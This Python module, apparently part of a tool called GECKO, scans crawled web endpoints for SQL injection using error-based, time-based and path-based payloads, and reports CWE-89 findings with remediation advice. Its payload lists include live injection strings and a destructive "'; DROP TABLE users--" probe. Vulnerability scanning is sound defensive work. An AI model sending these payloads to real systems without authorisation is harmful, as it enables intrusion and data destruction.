"""
GECKO - SQL Injection Scanner
Error-based and time-based SQLi detection on crawled endpoints and params.
"""
import asyncio
import re
import time
from urllib.parse import urlencode, urlparse, parse_qs


# Error-based payloads
ERROR_PAYLOADS = [
    ("'", "Single quote"),
    ('"', "Double quote"),
    ("' OR '1'='1", "Classic OR bypass"),
    ("' OR 1=1--", "Comment bypass"),
    ("'; DROP TABLE users--", "Stacked query (SQLi probe)"),
    ("' UNION SELECT NULL--", "UNION probe"),
    ("\\", "Backslash escape"),
    ("1' AND 1=2--", "Boolean false"),
    ("1' AND 1=1--", "Boolean true"),
]

# Time-based payloads (sleep/wait)
TIME_PAYLOADS = [
    ("' OR SLEEP(5)--", "MySQL sleep"),
    ("'; WAITFOR DELAY '0:0:5'--", "MSSQL waitfor"),
    ("' OR pg_sleep(5)--", "PostgreSQL sleep"),
    ("1 AND SLEEP(5)", "MySQL sleep (no quote)"),
    ("' OR 1=1 AND SLEEP(5)--", "MySQL sleep OR"),
]

# DB error signatures
DB_ERRORS = [
    r"sql syntax", r"mysql_fetch", r"ora-\d{5}", r"postgresql.*error",
    r"sqlite_", r"syntax error.*sql", r"unclosed quotation mark",
    r"jdbc.*exception", r"microsoft.*odbc", r"warning.*mysql",
    r"division by zero", r"invalid column name", r"column.*does not exist",
    r"error in your sql", r"sqlexception", r"unterminated string",
]
DB_ERROR_RE = re.compile("|".join(DB_ERRORS), re.IGNORECASE)

TIME_THRESHOLD = 4.5  # seconds


def _inject_param(endpoint, param, value):
    parsed = urlparse(endpoint)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [value]
    return parsed._replace(query=urlencode(params, doseq=True)).geturl()


def _inject_path(endpoint, value):
    """Replace numeric path segments to test path-based injection."""
    new = re.sub(r'/(\d+)', f'/{value}', endpoint)
    return new


class SQLiScanner:
    name = "sqli"
    severity = "critical"

    async def run(self, target, session, context):
        findings = []
        seen = set()

        endpoints = list(context.get("endpoints") or [])
        params = list(context.get("params") or [])

        if not endpoints:
            endpoints = [target]
        if not params:
            params = ["id", "search", "q", "user", "email", "page", "category"]

        # Build test cases
        tasks = []

        for endpoint in endpoints[:30]:
            parsed = urlparse(endpoint)
            url_params = list(parse_qs(parsed.query).keys())
            test_params = url_params if url_params else params[:6]

            # Test query params
            for param in test_params:
                for payload, technique in ERROR_PAYLOADS:
                    key = f"err|{endpoint}|{param}|{payload}"
                    if key not in seen:
                        seen.add(key)
                        tasks.append(_test_error_sqli(session, endpoint, param, payload, technique))

                # Time-based on numeric params only (avoid flooding)
                if any(kw in param.lower() for kw in ["id", "num", "page", "cat"]):
                    for payload, technique in TIME_PAYLOADS:
                        key = f"time|{endpoint}|{param}|{payload}"
                        if key not in seen:
                            seen.add(key)
                            tasks.append(_test_time_sqli(session, endpoint, param, payload, technique))

            # Test path-based injection on numeric segments
            if re.search(r'/\d+', endpoint):
                for payload, technique in ERROR_PAYLOADS[:4]:
                    key = f"path|{endpoint}|{payload}"
                    if key not in seen:
                        seen.add(key)
                        tasks.append(_test_path_sqli(session, endpoint, payload, technique))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, dict):
                findings.append(r)

        return findings


async def _test_error_sqli(session, endpoint, param, payload, technique):
    try:
        url = _inject_param(endpoint, param, payload)
        r = await session.get(url, timeout=8, follow_redirects=True)
        body = r.text
        if DB_ERROR_RE.search(body):
            match = DB_ERROR_RE.search(body)
            return {
                "type": "SQL Injection (Error-Based)",
                "severity": "CRITICAL",
                "endpoint": endpoint,
                "parameter": param,
                "payload": payload,
                "technique": technique,
                "evidence": f"DB error: '{match.group(0)}'",
                "confidence": "HIGH",
                "cwe": "CWE-89",
                "owasp": "A03:2021",
                "remediation": "Use parameterized queries / prepared statements",
            }
    except Exception:
        pass
    return None


async def _test_time_sqli(session, endpoint, param, payload, technique):
    try:
        url = _inject_param(endpoint, param, payload)
        t0 = time.time()
        r = await session.get(url, timeout=12, follow_redirects=True)
        elapsed = time.time() - t0
        if elapsed >= TIME_THRESHOLD:
            return {
                "type": "SQL Injection (Time-Based Blind)",
                "severity": "CRITICAL",
                "endpoint": endpoint,
                "parameter": param,
                "payload": payload,
                "technique": technique,
                "evidence": f"Response delayed {elapsed:.1f}s (threshold {TIME_THRESHOLD}s)",
                "confidence": "HIGH",
                "cwe": "CWE-89",
                "owasp": "A03:2021",
                "remediation": "Use parameterized queries / prepared statements",
            }
    except Exception:
        pass
    return None


async def _test_path_sqli(session, endpoint, payload, technique):
    try:
        url = _inject_path(endpoint, payload)
        r = await session.get(url, timeout=8, follow_redirects=True)
        if DB_ERROR_RE.search(r.text):
            match = DB_ERROR_RE.search(r.text)
            return {
                "type": "SQL Injection (Path-Based)",
                "severity": "CRITICAL",
                "endpoint": endpoint,
                "payload": payload,
                "technique": technique,
                "evidence": f"DB error in path injection: '{match.group(0)}'",
                "confidence": "MEDIUM",
                "cwe": "CWE-89",
                "owasp": "A03:2021",
            }
    except Exception:
        pass
    return None
